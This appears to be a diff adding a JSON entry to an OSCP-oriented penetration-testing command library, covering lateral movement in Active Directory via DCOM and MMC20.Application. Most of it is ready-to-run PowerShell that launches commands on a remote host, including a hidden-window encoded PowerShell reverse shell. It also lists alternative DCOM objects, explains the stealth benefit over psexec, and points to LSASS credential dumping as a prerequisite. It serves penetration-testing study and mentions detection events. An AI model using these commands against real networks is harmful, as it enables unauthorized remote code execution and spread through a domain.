@@ -1,0 +1,96 @@
+{
+  "id": "ad-dcom-exec",
+  "name": "AD Lateral Movement - DCOM Execution via MMC20.Application",
+  "command": "$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"<target_ip>\"))\n$dcom.Document.ActiveView.ExecuteShellCommand(\"cmd\", $null, \"/c <payload>\", \"7\")",
+  "description": "Lateral movement using Distributed COM (DCOM) by instantiating the MMC20.Application COM object on a remote host. DCOM allows remote instantiation of COM objects over port 135 (RPC endpoint mapper) \u2014 when you have local admin on the target and credentials. The MMC20.Application object's Document.ActiveView.ExecuteShellCommand method executes arbitrary commands on the remote host in the security context of the logged-on user or the impersonated credentials. This is a stealthier alternative to psexec/wmiexec as MMC is a legitimate Windows binary.",
+  "type": "script",
+  "platform": "windows",
+  "requires": [
+    "local-admin-on-target",
+    "valid-credentials",
+    "rpc-port-135-accessible"
+  ],
+  "tools": [
+    "powershell"
+  ],
+  "tags": [
+    "active-directory",
+    "lateral-movement",
+    "dcom",
+    "mmc",
+    "com-hijacking",
+    "remote-execution",
+    "living-off-the-land"
+  ],
+  "category": "Lateral Movement",
+  "subcategory": "DCOM",
+  "certifications": [
+    "OSCP"
+  ],
+  "primary_cert": "OSCP",
+  "source": "OSCP PEN-200 Chapter 23: Lateral Movement in Active Directory (23.1.6 DCOM)",
+  "examples": [
+    {
+      "label": "Instantiate MMC20.Application on remote target",
+      "command": "$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"192.168.50.73\"))"
+    },
+    {
+      "label": "Execute a command via ExecuteShellCommand (calc as test)",
+      "command": "$dcom.Document.ActiveView.ExecuteShellCommand(\"cmd\", $null, \"/c calc\", \"7\")"
+    },
+    {
+      "label": "Execute a PowerShell reverse shell payload",
+      "command": "$dcom.Document.ActiveView.ExecuteShellCommand(\"powershell\", $null, \"powershell -nop -w hidden -e <base64_payload>\", \"7\")"
+    },
+    {
+      "label": "Full one-liner with target IP variable",
+      "command": "$target = '192.168.50.73'\n$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1', $target))\n$dcom.Document.ActiveView.ExecuteShellCommand('powershell', $null, 'powershell -nop -w hidden -e <base64>', '7')"
+    },
+    {
+      "label": "Other useful DCOM ProgIDs for lateral movement",
+      "command": "# Excel.Application (requires Office)\n# ShellBrowserWindow\n# ShellWindows\n# Visio.Application\n# MMC20.Application.1  <- most reliable, no Office needed"
+    }
+  ],
+  "notes": "ExecuteShellCommand parameters: (1) command path, (2) directory (null = current), (3) arguments, (4) window state (7 = minimized/hidden). The '7' window state hides the spawned process window. Requires local admin rights on the target and RPC/DCOM access (port 135 + dynamic high ports 49152-65535). The spawned process inherits the security context of the connected user. Unlike PsExec, no service binary is created on the target \u2014 the command runs via MMC.exe which is a signed Microsoft binary. Detectable via DCOM authentication events (4624, type 3) and child processes spawned by mmc.exe. Must be run from a domain-joined Windows host or one with network access and appropriate credentials.",
+  "references": [
+    {
+      "title": "OffSec PEN-200 - Lateral Movement in Active Directory",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    },
+    {
+      "title": "MITRE ATT&CK - Distributed Component Object Model",
+      "url": "https://attack.mitre.org/techniques/T1021/003/"
+    },
+    {
+      "title": "CyberReason - DCOM Lateral Movement",
+      "url": "https://www.cybereason.com/blog/dcom-lateral-movement-techniques"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-wmi-cim-exec",
+      "rel": "alternative",
+      "note": "WMI/CIM lateral movement \u2014 similar technique but uses Win32_Process instead of DCOM COM objects."
+    },
+    {
+      "id": "smb-rce-psexec",
+      "rel": "alternative",
+      "note": "impacket-psexec is louder (drops a service) but works from Linux."
+    },
+    {
+      "id": "pth-impacket",
+      "rel": "alternative",
+      "note": "impacket-wmiexec authenticates with NT hash \u2014 useful when you can't get cleartext creds."
+    },
+    {
+      "id": "ad-mimikatz-sekurlsa",
+      "rel": "prereq",
+      "note": "Dump credentials from LSASS first to get cleartext or hash."
+    }
+  ],
+  "opsec": "moderate",
+  "mitre": [
+    "T1021.003"
+  ],
+  "exam": "exam-ok"
+}
